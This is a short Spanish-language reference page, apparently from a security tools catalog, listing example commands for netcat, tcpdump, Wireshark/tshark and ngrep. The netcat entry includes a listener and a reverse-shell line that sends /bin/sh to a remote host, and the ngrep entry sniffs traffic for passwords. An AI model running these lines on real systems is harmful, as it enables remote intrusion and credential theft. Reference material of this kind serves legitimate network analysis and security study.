Escucha y Captura

← Volver al catálogo

Netcat, tcpdump, Wireshark, análisis de tráfico y escucha de puertos.

🔗

Netcat (nc)

Multipropósito

Herramienta de red para escuchar puertos, transferir archivos y crear shells reversas.

$ nc -lvnp 4444
$ nc -e /bin/sh 192.168.1.100 4444
$ nc 192.168.1.1 80 < request.txt
📦

tcpdump

CLI

Capturador de paquetes por línea de comandos para análisis de tráfico.

$ tcpdump -i eth0 -w captura.pcap
$ tcpdump -i eth0 port 80 -A
$ tcpdump -r captura.pcap
🐟

Wireshark / tshark

GUI / CLI

Analizador de protocolos con interfaz gráfica y línea de comandos.

$ tshark -i eth0 -Y "http.request.method == GET"
$ tshark -r captura.pcap -T fields -e ip.src -e ip.dst
🔍

ngrep

Filtro

Grep para paquetes de red, busca patrones en el tráfico.

$ ngrep -i "password" -W byline port 80
